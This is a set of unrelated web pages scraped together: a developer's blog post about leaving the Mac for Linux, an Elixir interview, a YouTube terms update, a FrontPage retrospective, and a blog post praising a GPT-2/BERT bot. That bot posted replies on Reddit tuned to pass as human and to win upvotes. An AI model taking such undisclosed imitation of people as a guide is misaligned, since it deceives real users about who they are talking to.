<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="post-body"><p>To say that Lars (a.k.a <a href="https://twitter.com/lawik">@lawik</a>) is only, as he describes himself, an “Elixir consultant with too much enthusiasm” will be an understatement. The guy is all over the place, writing software, helping businesses move forward, writing <a href="https://underjord.io/the-beam-marches-forward.html">inspiring stories</a> about the future of the BEAM, and co-hosting <a href="https://devchat.tv/podcasts/elixir-mix/">an Elixir podcast.</a> That is how I first got to know Lars. </p><p>Based in Sweden, Lars started his programming journey by building websites with Notepad, then learning PHP and eventually taking his hobby pro through contract work, a failed startup, a couple of product teams and onward into independent consulting. He lives along the west coast of Sweden - a little way out of the city, where he attempts to grow vegetables with his wife and baby. The baby is terrible at growing vegetables.</p><p>In 2016 Lars discovered Erlang/Elixir, and this changed his view on developing software.</p><h2 id="what-brought-you-to-elixir">What brought you to Elixir?</h2><p><strong>Lars:</strong> At first, it was a bit of hype. I had a colleague who was quite a good talker and he went on at length about the legendary resilience of Erlang and hot updates for buried telephone switches. He spoke very well of Ecto changesets and was generally, very positive about Elixir. I ended up looking at talks about Phoenix. This was when <a href="https://hexdocs.pm/phoenix/channels.html">Channels</a> was the new hotness and just before <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> took the keynote stage. Looking at what the community was putting out made me give Elixir a try. When I went into business for myself, I was expecting to do a lot of Python, but I intended to try and get into Elixir.</p><p>I enjoy toying around with Raspberry Pi, so it was just a matter of time before I started playing with <a href="https://www.nerves-project.org/">Nerves</a>. I wanted to use the <a href="https://shop.pimoroni.com/products/inky-what?variant=21214020436051">Inky eInk</a> display with Nerves but the library was only available for Python. So, I decided to make a pure Elixir reimplementation. It proved to be a rabbit hole, but the Nerves community was very welcoming and helpful, and I was sold on Elixir for good. Love that crew!</p><p>I feel like I’ve written <a href="https://underjord.io/why-am-i-interested-in-elixir.html">at</a> <a href="https://underjord.io/why-am-i-still-excited-about-elixir.html">least</a> <a href="https://underjord.io/more-than-one-thing-at-a-time.html">four</a> <a href="https://underjord.io/the-beam-marches-forward.html">blog posts</a> about why I remain interested in and excited by Elixir and the BEAM. I like Python. I understand why people like Node.js but I can’t quite get excited about it. Either you go higher level on top of good abstractions, as the BEAM has, or you go lower level for unconstrained performance and flexibility.</p><h2 id="elixir-and-erlang-differ-significantly-from-other-mainstream-programming-languages-what-did-you-find-most-challenging-when-starting-with-the-stack">Elixir and Erlang differ significantly from other mainstream programming languages. What did you find most challenging when starting with the stack?</h2><p><strong>Lars:</strong> Immutability and the functional programming paradigm. Much of my early code did nothing or only did things by accident because I expected that the Map functions would mutate the map, not return a new one. Grasping map, reduce and all of their derivatives in the Enum module took me a bit. It was an adaptation process.</p><p>I guess it has also taken a while to disentangle <em>use</em>, <em>require</em>, <em>import</em> and <em>alias</em>. I still wouldn’t take bets on my understanding of <em>require</em> ;)</p><p>I’ve found the community incredibly welcoming at every step. I’ll call out <a href="https://twitter.com/nyaray">Emilio Nyaray</a> for helping me with some major refactoring and absorbing idiomatic Elixir. I hope everyone has such a good reception and it feels like the general feel of the community is very positive.</p><h2 id="tell-us-a-bit-about-your-most-recent-project-why-did-you-choose-elixir-for-it">Tell us a bit about your most recent project. Why did you choose Elixir for it?</h2><p><strong>Lars:</strong> A little while ago I made <a href="https://underjord.io/live-server-push-without-js.html">a very silly thing</a>. It is a way to show live information on a web page without using Javascript. Instead, it uses the <a href="https://en.wikipedia.org/wiki/Motion_JPEG">MJPEG</a> video protocol to deliver a new frame whenever the state changes. I used it to implement a live counter.</p><p>I used Plug and some code I found that the Nerves people had put together. The state is managed by a GenServer which keeps track of the connections as they come in, asking for the ”image”. It would add them to the list, render a new frame with some text on it, and send it to everyone connected. &nbsp;That would have been incredibly finicky in most runtimes. In my case, the biggest challenge was hitting the front page of Hacker News, where my Nginx config became a bottleneck for concurrent connections. I might have also needed to tweak my Plug a bit. It all maxed out at 450 or so concurrent connections, and I think it should be able to do way more.</p><p>I am about to add some upgrades to the <a href="https://beambloggers.com/">Beambloggers Webring</a> soon that follow the same vein. I don’t like running a database if I don’t need one. So the MJPEG thing is just in-memory data and a temporary state. I restart it, the connections are gone, and start building up again. Similarly, I want Beambloggers to bring in some fresh information about the different blogs. So I’ll have it run a GenServer that pulls in RSS feeds and parses out some recent items that I can link to. In-memory, background work.</p><p>Such use cases are something I’d hesitate to do in Python, for example. If I build something stateful in Python, I feel like it is bound to leak somewhere. Elixir and Erlang have abstractions that allow me to do such things with confidence.</p><h2 id="you-also-do-elixir-consulting-what-kinds-of-applications-do-your-clients-choose-the-beam-for-as-opposed-to-other-tech-stacks"><br>You also do Elixir consulting. What kinds of applications do your clients choose the BEAM for, as opposed to other tech stacks?</h2><p><strong>Lars: </strong>Distributed applications that run indefinitely. Those line up with the absolute majority of work I’ve ever done. Servers, services, and web applications. If I were building large amounts of CLI tooling, I wouldn’t pick it. If I needed native desktop bindings, I wouldn’t pick it. But generally, I’m in the web application world.</p><p>As the cultural successor to Ruby on Rails, I am seeing Phoenix being used all over the place and quite popular with startups. I have seen a lot of companies picking up Elixir without necessarily knowing much about OTP. I think this is fine, and mostly speaks to the maturity of Phoenix and Ecto that people don’t need to.</p><h2 id="in-the-era-of-kubernetes-and-microservices-where-do-you-see-monolithic-beam-applications-fit-into-the-picture">In the era of Kubernetes and Microservices, where do you see monolithic BEAM applications fit into the picture?</h2><p><strong>Lars:</strong> It is interesting. The way Erlang structures things in multiple <em>applications</em> on a <em>node</em> as part of a <em>cluster</em> brings in some infrastructure concerns. I think some people worry that this unconventional approach is a problem when working in a polyglot environment, for example. I don’t think so. Lots of people put the BEAM in their containers and ship it out to the Kubernetes cluster in the same way as every other stack. Microservices tend to be about the contracts you expose, not the internals of how the application runs. Therefore, the fact you run a BEAM application or even a cluster of BEAM applications as one service is perfectly fine.</p><p>Where I believe much of the power of BEAM is though, is if you don’t rely on microservices and a polyglot-heavy environment. You might then be able to cut off a lot of dead weight. Or at least, manage the complexity using tools you know, rather than write YAML until it goes away. Some of the tools are there by design; others are perhaps, what we should be building in the future. I’ve gotten into it to some extent in my blog post <a href="https://underjord.io/the-beam-marches-forward.html"><em>The BEAM marches forward.</em></a></p><p><br>For an in-between path, I would take a look at <a href="https://www.nomadproject.io/">Nomad</a> which seems to be a slightly lighter Kubernetes competitor that can run things without containers. I think it suits the BEAM very well, as Elixir releases handle many of the perks of containerization. I haven’t tried it but if you do, let me know. I am curious about how Nomad differs from Kubernetes.</p><h2 id="as-someone-listening-to-podcasts-for-over-15-years-i-can-t-help-but-ask-how-does-one-get-the-courage-to-host-a-podcast">As someone listening to podcasts for over 15 years, I can’t help but ask. How does one get the courage to host a podcast?</h2><p><strong>Lars:</strong> I don’t think I’m particularly brave. You should see how uncomfortable I am on ladders.</p><p>I think I picked up a habit of pressing through discomfort partly in my teens and partly running a startup with a mentor of mine. When I was around 14, my dad passed away, essentially a heart attack out of the blue. That experience totally shifted my threshold for pain or discomfort and deeply changed how I approached life. That change in attitude was probably part of why I was keen to do the startup. And the startup led to everything else. Turns out that running a business when I barely knew what I was doing as a technical lead was a constant exercise in being okay with discomfort.</p><p>I don’t recommend overworking. I don’t recommend burning yourself out on a startup. Yet, the discomfort is part of the learning sometimes. If you spend a lot of time outside your comfort zone, you are likely to learn more. Being aware that you are choosing discomfort and staying with it is powerful.</p><p>Oh, a podcast? Well, you get asked on as a guest and enjoy it. And then, when the OG host goes off to start a new one, you get contacted as one of the potential new hosts. And since you try not to worry too much and are willing to tackle discomfort, you fret about it for a bit, ask too many questions, and then give it a shot.</p><p><strong>Lars:</strong> It might feel daunting at first. Don’t feel pressure to understand the BEAM, Erlang, OTP, and all of that good stuff right away. If you are an inexperienced developer, any language can seem imposing. We all end up being beginners when we move over to a new ecosystem. I think we will all be happier if we concede that we will not master everything and will only learn a portion of it. What one should focus on instead is building software well.</p></div>

        <div><p>We periodically update our Terms of Service to make sure they are clear, easy to understand and meet the needs of our partners, advertisers and viewers. Starting today, we’re rolling out an updated Terms of Service in the United States. These new terms will be effective in countries outside of the United States in mid-year 2021. Please read through the <a href="https://www.youtube.com/t/terms">updated terms</a> carefully, they include the following changes.</p><p>First, our Terms of Service already expressly state that you are not allowed to “collect or harvest any information that might identify a person (for example, usernames), unless permitted by that person.” This has always included facial recognition data, and with today’s updated Terms of Service, we are making that explicitly clear.</p><p>Second, ads can now appear on videos from channels not in the YouTube Partner Program (YPP), and we will begin gradually placing ads on brand safe videos. This is part of our ongoing investments in new solutions, like Home Feed ads, that help advertisers responsibly tap into the full scale of YouTube to connect with their audiences and grow their businesses. Advertisers will continue to have full access to our brand suitability controls. Over the past three years, we improved our ability to identify appropriate placements for advertisers, in part by working closely with our advertising partners and <a href="https://wfanet.org/knowledge/item/2020/09/23/WFA-and-platforms-make-major-progress-to-address-harmful-content">industry organizations</a>. Because these channels are not in YPP, there is no creator revenue share, but creators can still apply to YPP once they hit the <a href="https://support.google.com/youtube/answer/72851?hl=en">eligibility criteria</a>, which remains the same.</p><p>Finally, for U.S. creators in YPP, our updated Terms state that any revenue payments from YouTube will now be treated as royalties from a U.S. tax perspective, and that Google will withhold taxes from these payments if it is required by law. U.S. creators will generally be unaffected by these withholding taxes as long as they provide valid tax documentation in <a href="https://support.google.com/adsense/answer/2490070?hl=en">Adsense</a>. For creators outside of the U.S., we will provide more details in 2021 as the terms become available in their countries.</p><p>You can view the previous Terms of Service and how it compares with this update in our <a href="https://yt.be/help/ToS20">help forum</a>.</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	
	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

<p>Sometimes I find these AI / programming hobby projects that I just wished I had thought of… </p>



<p><a href="https://www.linkedin.com/in/willstedden/"><strong>Will Stedden</strong></a> combined OpenAI’s <strong><a href="https://openai.com/blog/better-language-models/">GPT-2</a></strong> deep learning text generation model with another deep-learning language model by Google called <strong><a href="https://towardsdatascience.com/bert-explained-state-of-the-art-language-model-for-nlp-f8b21a9b6270">BERT</a></strong> (Bidirectional Encoder Representations from Transformers) and created an elaborate architecture that had one purpose: <strong><em>posting the best replies on Reddit.</em></strong></p>



<p>The architecture is shown at the end of this post — copied from Will’s original blog<em> <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">here</a></em>. Moreover, you can read&nbsp;<a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">this post</a>&nbsp;for details regarding the construction of the system. But let me see whether I can explain you what it does in simple language. </p>



<p>The below is what a Reddit comment and reply thread looks like. We have <em>str8cokane </em>making a comment to an original post (not in the picture), and then <em>tupperware-party</em> making a reply to that comment, followed by another reply by <em>str8cokane</em>. Basically, Will wanted to create an AI/bot that could write replies like <em>tupperware-party</em> that real people like <em>str8cokane</em> would not be able to distinguish from “real-people” replies.</p>



<p>Note that with 4 <strong>points</strong>, <em>str8cokane</em>‘s original comments was <em><strong>“liked”</strong></em> more than <em>tupperware-party</em>‘s reply and <em>str8cokane</em>‘s next reply, which were only <strong><em>upvoted </em></strong>2 and 1 times respectively.</p>



<figure><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party3.png" alt="gpt2-bert on China"><figcaption>Example reddit comment and replies (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/</a>)</figcaption></figure>



<p>So here’s what the final architecture looks like, and my attempt to explain it to you.</p>



<ol><li>Basically, we start in the upper left corner, where Will uses a database (i.e. <em>corpus</em>) of Reddit comments and replies to fine-tune a standard, pretrained GPT-2 model to get it to be good at <strong>generating (red: “fake”) realistic Reddit replies</strong>. </li><li>Next, in the upper middle section, these fake replies are piped into a standard, pretrained BERT model, along with the original, real Reddit comments and replies. This way the BERT model sees both real and fake comments and replies. Now, <strong>our goal is to make replies that are undistinguishable from real replies</strong>. Hence, this is the task the BERT model gets. And we keep fine-tuning the original GPT-2 generator until the BERT discriminator that follows is no longer able to distinguish fake from real replies. Then the generator is “fooling” the discriminator, and we know we are generating fake replies that look like real ones! <br><em>You can find more information about such generative adversarial networks <a href="https://paulvanderlaken.com/2017/10/30/generative-adversarial-networks-gan-explained/">here</a>.</em></li><li>Next, in the top right corner, we fine-tune another BERT model. This time we give it the original Reddit comments and replies along with the amount of times they were upvoted (i.e. sort of like likes on facebook/twitter). Basically, we train a BERT model to <strong>predict for a given reply, how much likes it is going to get</strong>.</li><li>Finally, we can go to production in the lower lane. We give a real-life comment to the GPT-2 generator we trained in the upper left corner, which produces several fake replies for us. These candidates we run through the BERT discriminator we trained in the upper middle section, which determined which of the fake replies we generated look most real. Those fake but realistic replies are then input into our trained BERT model of the top right corner, which predicts for every fake but realistic reply the amount of likes/upvotes it is going to get. Finally, <strong>we pick and reply with the fake but realistic reply that is predicted to get the most upvotes!</strong></li></ol>



<figure><p><a href="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"><img src="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"></a>
</p><figcaption>What Will’s final architecture, combining GPT-2 and BERT, looked like (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org</a>)</figcaption></figure>



<p>The results are astonishing! Will’s bot sounds like a real youngster internet troll! Do have a look at <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">the original blog</a>, but here are some examples. Note that <em>tupperware-party</em> — the Reddit user from the above example — is actually Will’s AI. </p>



<figure><a href="https://www.reddit.com/r/sciencefiction/comments/evqiti/dune_logo_unveiled_at_event_copyright_claimants/fg44yzw/?context=3"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party1.png" alt="COMMENT: 'Dune’s fandom is old and intense, and a rich thread in the cultural fabric of the internet generation' BOT_REPLY:'Dune’s fandom is overgrown, underfunded, and in many ways, a poor fit for the new, faster internet generation.'"></a></figure>



<figure><a href="https://www.reddit.com/r/BurningMan/comments/ep6pyq/playa_lung/feilsjn/?context=8&amp;depth=9"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party2.png" alt="bot responds to specific numerical bullet point in source comment"></a></figure>



<p>Will ends his blog with <a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">a link to the tutorial</a> if you want to build such a bot yourself. Have a try!</p>



<p>Moreover, he also notes the ethical concerns:</p>



<blockquote><p>I know there are definitely some ethical considerations when creating something like this. The reason I’m presenting it is because I actually think it is&nbsp;<a href="https://www.wired.com/story/company-wants-billions-make-ai-safe-humanity/">better</a>&nbsp;for more people to know about and be able to grapple with this kind of technology. If just a few people know about the capacity of these machines, then it is more likely that those small groups of people can abuse their advantage.</p><p>I also think that this technology is going to change the way we think about what’s important about being human. After all, if a computer can effectively automate the paper-pushing jobs we’ve constructed and all the bullshit we create on the internet to distract us, then maybe it’ll be time for us to move on to something more meaningful.</p><p>If you think what I’ve done is a problem feel free to&nbsp;email me&nbsp;, or publically shame me on&nbsp;<a href="https://twitter.com/bonkerfield">Twitter</a>.</p><cite>Will Stedden via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/2020/02/combining-gpt-2-and-bert/</a></cite></blockquote>

